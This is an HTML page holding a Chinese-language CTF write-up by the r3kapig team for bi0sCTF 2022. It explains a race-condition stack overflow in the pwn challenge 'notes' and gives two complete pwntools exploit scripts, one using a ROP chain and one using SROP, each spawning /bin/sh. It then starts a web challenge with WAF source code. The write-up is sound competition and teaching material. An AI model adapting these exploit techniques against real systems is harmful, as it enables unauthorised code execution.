@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>bi0sCTF2022 Writeup | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for bi0sCTF2022 Writeup" />
+    <meta property="og:description" content="Writeup for bi0sCTF2022 Writeup" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                前言
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#notes">notes</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#vuln-drive-2">vuln-drive-2</a>
+    
+                <a class="dropdown-item" href="#pycgimisc">pycgimisc</a>
+    
+                <a class="dropdown-item" href="#emo-locker">emo-locker</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#lowkeyenc">lowkeyenc</a>
+    
+                <a class="dropdown-item" href="#rusted">rusted</a>
+    
+                <a class="dropdown-item" href="#eerie_jit">eerie_jit</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#leaky-dsa">leaky-dsa</a>
+    
+                <a class="dropdown-item" href="#bad2code">bad2code</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#snek-game">snek-game</a>
+    
+                <a class="dropdown-item" href="#rgb-cheems">rgb-cheems</a>
+    
+                <a class="dropdown-item" href="#droidcomp">droidcomp</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                结语
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">前言</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#notes" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">notes</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#vuln-drive-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">vuln-drive-2</span>
+            </a>
+    
+<a href="#pycgimisc" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pycgimisc</span>
+            </a>
+    
+<a href="#emo-locker" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">emo-locker</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#lowkeyenc" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lowkeyenc</span>
+            </a>
+    
+<a href="#rusted" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rusted</span>
+            </a>
+    
+<a href="#eerie_jit" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">eerie_jit</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#leaky-dsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">leaky-dsa</span>
+            </a>
+    
+<a href="#bad2code" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bad2code</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu5" class="collapse sidebar-submenu">
+            <a href="#snek-game" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">snek-game</span>
+            </a>
+    
+<a href="#rgb-cheems" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rgb-cheems</span>
+            </a>
+    
+<a href="#droidcomp" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">droidcomp</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu6" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">结语</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu6" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="bi0sctf2022-writeup"><a class="header-link" href="#bi0sctf2022-writeup"></a>bi0sCTF2022 Writeup</h1>
+<h2 id="前言"><a class="header-link" href="#前言"></a>前言:</h2>
+<p>本次bi0sCTF 2022属于休闲玩玩,我们获得了第四名.其中有部分题目还是很有趣.现将师傅们的writeup整理如下,长期招新欢迎感兴趣的师傅简历<code>root@r3kapig.com</code></p>
+<p class="img-container"><img src="https://imgur.com/NJL3VZx.png" alt=""></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn:</h2>
+<h3 id="notes"><a class="header-link" href="#notes"></a>Notes:</h3>
+<p>(本题开始看的时间有点晚了,导致没有在比赛时间内完成,赛后整理writeup)</p>
+<p>程序启动了两个线程，两个线程共用一段共享内存，然后等待两个线程执行完</p>
+<p class="img-container"><img src="https://imgur.com/xOISXmm.png" alt=""></p>
+<p>漏洞点在于条件竞争，另一个线程可以在检查过后改掉size，从而造成栈溢出</p>
+<p>比赛时的问题有三点:</p>
+<ol class="list">
+<li>不知道怎么卡条件竞争的时间，爆破影响了数据流</li>
+<li>知道泄露Libc，但是返回main函数之后多个相同功能的进程在执行，乱了</li>
+<li>想到了SROP，但是当时想的是用read的返回值来控制rax，然后并没有可以直接用的read，只有read_input</li>
+</ol>
+<p>条件竞争的时间可以用一次add和encrypt然后sleep(6)来卡，这样可以执行完第一个compare并发送sent，这样就保证了两个线程的时间基本是同步的，而无需爆破，然后sleep(2)通过检查后把size改掉，造成栈溢出</p>
+<p>方法1:利用memcpy的参数变化来执行execve</p>
+<p>如果控制size为0x3b0，memcpy的三个参数会是这样</p>
+<p class="img-container"><img src="https://imgur.com/Ve0iYqG.png" alt=""></p>
+<p>结束以后的参数，可以看到rcx和rdx以及rsi的内容都是memcpy可以控制的，而syscall函数里会把rcx给rdx，把rdx给rsi，把rsi给rdi，所以只要控制系统调用号为59就可以了，具体的实现跟源码有关系（有点复杂）只能说赛后很碰巧看到了参数的内容貌似是可控的 ，赛中观察过这个点 但貌似当时的参数不行</p>
+<p class="img-container"><img src="https://imgur.com/HArQdtM.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/IZsHwTb.png" alt=""></p>
+<p>exp:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./notes&#x27;</span>)
+<span class="hljs-comment">#p=remote(&#x27;pwn.chall.bi0s.in&#x27;,37981)</span>
+libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+elf=ELF(<span class="hljs-string">&#x27;./notes&#x27;</span>)
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+r = <span class="hljs-keyword">lambda</span> x: p.recv(x)
+ra = <span class="hljs-keyword">lambda</span>: p.recvall()
+rl = <span class="hljs-keyword">lambda</span>: p.recvline(keepends=<span class="hljs-literal">True</span>)
+ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x, drop=<span class="hljs-literal">True</span>)
+sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)
+sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)
+sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)
+ia = <span class="hljs-keyword">lambda</span>: p.interactive()
+c = <span class="hljs-keyword">lambda</span>: p.close()
+li = <span class="hljs-keyword">lambda</span> x: log.info(x)
+db = <span class="hljs-keyword">lambda</span>: gdb.attach(p)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span>(<span class="hljs-params">ch</span>):</span>
+    sla(<span class="hljs-string">&#x27;Enter Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(ch))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name,size,cont</span>):</span>
+    sl(<span class="hljs-string">&#x27;1&#x27;</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
+    sa(<span class="hljs-string">&#x27;Enter Note Name:&#x27;</span>,name)
+    sla(<span class="hljs-string">&#x27;Enter Note Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    sa(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>,cont)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
+    menu(<span class="hljs-number">2</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx,name,cont</span>):</span>
+    menu(<span class="hljs-number">3</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">&#x27;Note Name: &#x27;</span>,name)
+    sla(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>, cont)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">size,name</span>):</span>
+    menu(<span class="hljs-number">4</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    sla(<span class="hljs-string">&#x27;Enter Name: &#x27;</span>,name)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">idx,cont</span>):</span>
+    menu(<span class="hljs-number">5</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>,cont)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">cont</span>):</span>
+    <span class="hljs-keyword">return</span> xor(cont, <span class="hljs-string">b&quot;2111485077978050&quot;</span>)
+syscall=<span class="hljs-number">0x401bc2</span>
+poprdi=<span class="hljs-number">0x0000000000401bc0</span>
+poprbp=<span class="hljs-number">0x00000000004011ed</span>
+<span class="hljs-comment">#gdb.attach(p,&#x27;b* 0x401B7A&#x27;)</span>
+add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+payload=<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>+p64(poprdi)+p64(<span class="hljs-number">0x3b</span>)+p64(elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>])+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x330</span>+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">4</span>
+encrypt(<span class="hljs-number">0</span>,decrypt(payload))
+sleep(<span class="hljs-number">6</span>)
+add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+sleep(<span class="hljs-number">2</span>)
+edit(<span class="hljs-built_in">len</span>(payload),<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+sleep(<span class="hljs-number">3</span>)
+
+p.interactive()</code></pre><p>另外官方中给的方法是SROP(<code>https://discord.com/channels/862962550169665568/1063844806977130596/1066734947768999946</code>)，比赛中也想到了用SROP，只不过想用read的返回值来控制rax，忘了可以直接syscall了，先往bss段写一个/bin/sh，然后执行SROP即可.这里脚本参考了部分来自于sAsPeCt师傅(<code>sAsPeCt#8643</code>)的脚本(<code>https://discord.com/channels/862962550169665568/1063844806977130596/1066799179550171237</code>)</p>
+<p>exp:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./notes&#x27;</span>)
+<span class="hljs-comment">#p=remote(&#x27;pwn.chall.bi0s.in&#x27;,37981)</span>
+libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+elf=ELF(<span class="hljs-string">&#x27;./notes&#x27;</span>)
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+r = <span class="hljs-keyword">lambda</span> x: p.recv(x)
+ra = <span class="hljs-keyword">lambda</span>: p.recvall()
+rl = <span class="hljs-keyword">lambda</span>: p.recvline(keepends=<span class="hljs-literal">True</span>)
+ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x, drop=<span class="hljs-literal">True</span>)
+sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)
+sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)
+sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)
+ia = <span class="hljs-keyword">lambda</span>: p.interactive()
+c = <span class="hljs-keyword">lambda</span>: p.close()
+li = <span class="hljs-keyword">lambda</span> x: log.info(x)
+db = <span class="hljs-keyword">lambda</span>: gdb.attach(p)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span>(<span class="hljs-params">ch</span>):</span>
+    sla(<span class="hljs-string">&#x27;Enter Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(ch))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name,size,cont</span>):</span>
+    sl(<span class="hljs-string">&#x27;1&#x27;</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
+    sa(<span class="hljs-string">&#x27;Enter Note Name:&#x27;</span>,name)
+    sla(<span class="hljs-string">&#x27;Enter Note Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    sa(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>,cont)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
+    menu(<span class="hljs-number">2</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx,name,cont</span>):</span>
+    menu(<span class="hljs-number">3</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">&#x27;Note Name: &#x27;</span>,name)
+    sla(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>, cont)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">size,name</span>):</span>
+    menu(<span class="hljs-number">4</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))
+    sla(<span class="hljs-string">&#x27;Enter Name: &#x27;</span>,name)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">idx,cont</span>):</span>
+    menu(<span class="hljs-number">5</span>)
+    sla(<span class="hljs-string">&#x27;Enter Note ID: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">&#x27;Enter Note Content: &#x27;</span>,cont)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">cont</span>):</span>
+    <span class="hljs-keyword">return</span> xor(cont, <span class="hljs-string">b&quot;2111485077978050&quot;</span>)
+syscall=<span class="hljs-number">0x401bc2</span>
+poprdi=<span class="hljs-number">0x0000000000401bc0</span>
+poprbp=<span class="hljs-number">0x00000000004011ed</span>
+gdb.attach(p,<span class="hljs-string">&#x27;b* 0x401B7A&#x27;</span>)
+add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+bss= <span class="hljs-number">0x404100</span>
+frame = SigreturnFrame(kernel=<span class="hljs-string">&#x27;amd64&#x27;</span>)
+frame.rip = <span class="hljs-number">0x401bc2</span> <span class="hljs-comment"># syscall;</span>
+frame.rax = <span class="hljs-number">59</span> <span class="hljs-comment"># RT_SIGRETURN</span>
+frame.rdi = bss <span class="hljs-comment"># /bin/sh</span>
+frame.rsi = <span class="hljs-number">0x404200</span> <span class="hljs-comment"># NULL</span>
+frame.rdx = <span class="hljs-number">0x404208</span> <span class="hljs-comment"># NULL</span>
+
+payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">64</span> + p64(<span class="hljs-number">0</span>) + p64(poprdi) + p64(bss) + p64(<span class="hljs-number">0x4013D6</span>) + p64(poprdi) + p64(<span class="hljs-number">15</span>) + p64(elf.plt[<span class="hljs-string">&#x27;syscall&#x27;</span>]) + <span class="hljs-built_in">bytes</span>(frame)
+encrypt(<span class="hljs-number">0</span>,decrypt(payload))
+sleep(<span class="hljs-number">6</span>)
+add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+sleep(<span class="hljs-number">2</span>)
+edit(<span class="hljs-built_in">len</span>(payload),<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)
+sleep(<span class="hljs-number">3</span>)
+sla(<span class="hljs-string">b&quot;Sent&quot;</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)
+sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
+sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
+p.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web:</h2>
+<h3 id="vuln-drive-2"><a class="header-link" href="#vuln-drive-2"></a>Vuln-Drive 2:</h3>
+<h4 id="分析"><a class="header-link" href="#分析"></a>分析:</h4>
+<p>首先简单看看docker-compose.yml，发现php环境在外网</p>
+<p>根据networks配置可知waf与其他两个环境互通，frontend与app不互通</p>
+<p class="img-container"><img src="https://imgur.com/2YzLTfs.png" alt=""></p>
+<h4 id="审计"><a class="header-link" href="#审计"></a>审计:</h4>
+<p>以下为了方便叙述思路，将调整讲解的顺序，其中会涉及到部分穿插</p>
+<h5 id="waf"><a class="header-link" href="#waf"></a>waf:</h5>
+<p>这个容器中运行了一个go程序</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> (
+        <span class="hljs-string">&quot;fmt&quot;</span>
+        <span class="hljs-string">&quot;log&quot;</span>
+        <span class="hljs-string">&quot;net/http&quot;</span>
+        <span class="hljs-string">&quot;net/http/httputil&quot;</span>
+        <span class="hljs-string">&quot;net/url&quot;</span>
+        <span class="hljs-string">&quot;strings&quot;</span>
+)
+<span class="hljs-keyword">var</span> invalid = [<span class="hljs-number">6</span>]<span class="hljs-keyword">string</span>{<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>}
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ProxyRequestHandler</span><span class="hljs-params">(proxy httputil.ReverseProxy)</span> <span class="hljs-title">func</span><span class="hljs-params">(http.ResponseWriter, *http.Request)</span></span> {
+    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r http.Request)</span></span> {
+                <span class="hljs-keyword">if</span>(r.Header.Get(<span class="hljs-string">&quot;X-pro-hacker&quot;</span>)!=<span class="hljs-string">&quot;&quot;</span>){
+                     fmt.Fprintf(w, <span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)
+                     <span class="hljs-keyword">return</span>
+                }
+                <span class="hljs-keyword">if</span>(strings.Contains(r.Header.Get(<span class="hljs-string">&quot;flag&quot;</span>), <span class="hljs-string">&quot;gimme&quot;</span>)){
+                    fmt.Fprintf(w, <span class="hljs-string">&quot;No flag For you!\n&quot;</span>)
+                    <span class="hljs-keyword">return</span>
+                }
+                <span class="hljs-keyword">if</span>(r.Header.Get(<span class="hljs-string">&quot;Token&quot;</span>)!=<span class="hljs-string">&quot;&quot;</span>){
+                    <span class="hljs-keyword">for</span> _, x := <span class="hljs-keyword">range</span> invalid {
+                            <span class="hljs-keyword">if</span>(strings.Contains(r.Header.Get(<span class="hljs-string">&quot;Token&quot;</span>), x)){
